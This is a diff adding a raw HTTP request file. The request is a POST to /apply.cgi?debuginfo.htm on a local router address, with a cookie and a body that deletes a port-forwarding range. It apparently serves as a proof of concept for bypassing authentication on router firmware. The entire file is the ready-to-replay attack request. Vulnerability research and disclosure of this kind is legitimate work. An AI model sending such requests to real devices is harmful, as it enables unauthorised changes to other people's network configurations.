@@ -1,0 +1,7 @@
+POST /apply.cgi?debuginfo.htm HTTP/1.1
+Content-Type: text/html
+HOST: 192.168.0.50
+Cookie: uid=xhyxhy
+Content-Length: 45
+
+submit_flag=forwarding_del_range&select_del=2
